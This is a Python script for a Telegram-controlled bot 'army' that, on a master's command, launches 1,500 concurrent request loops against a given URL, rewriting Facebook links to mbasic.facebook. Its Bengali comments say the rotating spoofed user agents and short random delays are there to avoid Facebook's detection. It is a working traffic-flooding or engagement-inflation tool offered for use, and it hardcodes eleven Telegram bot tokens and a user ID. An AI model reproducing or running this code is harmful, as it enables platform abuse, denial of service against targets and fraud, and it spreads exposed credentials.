import asyncio
import aiohttp
import random
from aiohttp import web

# [AIP2K SOVEREIGN COMMAND CENTER - ULTIMATE MASTER VERSION]
MASTER_TOKEN = "8536346083:AAGYUDR6cd7hI9_41_gNbQdREbBb6Dn_9v4"
MASTER_ID = 1938591484
SLAVE_ARMY = {
    "S1": "8064983761:AAGEZRc9LASS7Fkifm3C3ebOdykCTTJUZ_0", "S2": "8460123410:AAE61k-8wPWE4hkmOxge802d8k7CTrhcfCE",
    "S3": "8529444938:AAHd0VxfMeMlA3XSu9NH5RiBcUvRW09atgE", "S4": "8500850898:AAEje_m--Tt7eOYjKWwpxXC_BYl2NhiqgVc",
    "S5": "8497321044:AAGGQ2eng3ZgtjOECMRyHO_OJjvSuLTH9RI", "S6": "8201736485:AAGFSv-af1506M9pipoaFbHKQW2vLloIMFk",
    "S7": "8420555273:AAHD4mJVw1wY0_nQVSenIBNEaAomcH98sXo", "S8": "8524480261:AAGCe54hX-9PjDsVQW5whE36kj5IBNmKRKA",
    "S9": "8579851332:AAGSd7Mtze2XfBlFoQWcIL5JrzBiz47qXAI", "S10": "8525114674:AAE7LnGxkqaaL6M0DH25NiU3WYHygWYlON4"
}

class AIP2K_Supreme_Core:
    def __init__(self):
        self.session = None
        self.targets = {}
        self.soldier_stats = {name: {"ok": 0, "no": 0} for name in SLAVE_ARMY}
        self.soldier_active = {name: True for name in SLAVE_ARMY}
        self.identities = {}
        self.success_logs = []

    async def _fetch_identities(self):
        for name, token in SLAVE_ARMY.items():
            try:
                async with self.session.get(f"https://api.telegram.org/bot{token}/getMe") as r:
                    data = await r.json()
                    self.identities[name] = f"@{data['result']['username']}" if data.get('ok') else f"Soldier_{name}"
            except: self.identities[name] = f"Unknown_{name}"

    async def _notify(self, text):
        print(f">>> [RENDER-LOG]: {text}") # রেন্ডার লগে আউটপুট নিশ্চিত করা
        url = f"https://api.telegram.org/bot{MASTER_TOKEN}/sendMessage"
        try: await self.session.post(url, json={'chat_id': MASTER_ID, 'text': text, 'parse_mode': 'Markdown'})
        except: pass

    async def _strike_engine(self, name, target_url):
        while name in self.targets and self.soldier_active[name]:
            # লজিক: হাই-কোয়ালিটি রোটেটিং হেডার
            agents = [
                "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
                "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
            ]
            current_agent = random.choice(agents)
            headers = {
                'User-Agent': current_agent,
                'Referer': 'https://www.google.com/',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            }
            try:
                # লজিক: mbasic.facebook যা সফল হিট এনেছিল
                final_url = target_url.replace("www.facebook", "mbasic.facebook")
                async with self.session.get(final_url, headers=headers, timeout=20) as r:
                    if r.status == 200:
                        self.soldier_stats[name]["ok"] += 1
                        print(f"🔥 SUCCESS: {name} | Total OK: {self.soldier_stats[name]['ok']}")
                        log_msg = f"🎯 **SUCCESS LOG**\n👤 {name}\n📱 `{current_agent[:40]}...`"
                        self.success_logs.append(log_msg)
                        if self.soldier_stats[name]["ok"] % 5 == 0: # প্রতি ৫ সাকসেসে রিপোর্ট
                            asyncio.create_task(self._notify(log_msg))
                    else:
                        self.soldier_stats[name]["no"] += 1
            except Exception as e:
                self.soldier_stats[name]["no"] += 1
            
            # লজিক: মিলি-সেকেন্ড বিরতি যাতে ফেসবুক ডিটেক্ট না করে
            await asyncio.sleep(random.uniform(0.1, 0.5))

    async def _send_dashboard(self):
        msg = "📊 **AIP2K FINAL DASHBOARD**\n\n"
        for name in SLAVE_ARMY:
            id_name = self.identities.get(name, name)
            msg += f"👤 {id_name}\n✅ OK: {self.soldier_stats[name]['ok']} | ❌ NO: {self.soldier_stats[name]['no']}\n\n"
        await self._notify(msg)

    async def handle_updates(self):
        offset = 0
        await self._fetch_identities()
        await self._notify("🔱 **AIP2K SUPREME MASTER ONLINE**\nRender Logs & Success Tracker Active.")
        while True:
            try:
                url = f"https://api.telegram.org/bot{MASTER_TOKEN}/getUpdates?offset={offset}"
                async with self.session.get(url, timeout=10) as r:
                    data = await r.json()
                    for update in data.get('result', []):
                        offset = update['update_id'] + 1
                        msg = update.get('message', {})
                        cmd = msg.get('text', '')
                        if msg.get('from', {}).get('id') != MASTER_ID: continue

                        if cmd.startswith("http"):
                            self.targets = {cmd: True}
                            self.success_logs = []
                            await self._notify(f"⚔️ **MASTER STRIKE INITIATED:**\n{cmd}")
                            for name in SLAVE_ARMY:
                                for _ in range(150): # স্ট্যাবল থ্রেড কাউন্ট
                                    asyncio.create_task(self._strike_engine(name, cmd))

                        elif cmd == "/status":
                            await self._send_dashboard()
                        
                        elif cmd == "/logs":
                            recent = "\n\n".join(self.success_logs[-5:]) if self.success_logs else "No success logs."
                            await self._notify(f"📜 **DETAILED SUCCESS LOGS:**\n{recent}")

                        elif cmd == "/stop":
                            self.targets = {}
                            await self._notify("🛑 **OPERATIONS CEASED.**")

                        elif cmd.startswith("/rest "):
                            name = cmd.split()[1].upper()
                            if name in self.soldier_active: self.soldier_active[name] = False
                        
                        elif cmd.startswith("/wake "):
                            name = cmd.split()[1].upper()
                            if name in self.soldier_active:
                                self.soldier_active[name] = True
                                if self.targets:
                                    t = list(self.targets.keys())[0]
                                    for _ in range(150): asyncio.create_task(self._strike_engine(name, t))
            except: await asyncio.sleep(1)

async def main():
    bot = AIP2K_Supreme_Core()
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=100)) as sess:
        bot.session = sess
        app = web.Application(); runner = web.AppRunner(app)
        await runner.setup(); await web.TCPSite(runner, '0.0.0.0', 10000).start()
        await bot.handle_updates()

if __name__ == "__main__":
    asyncio.run(main())
                        
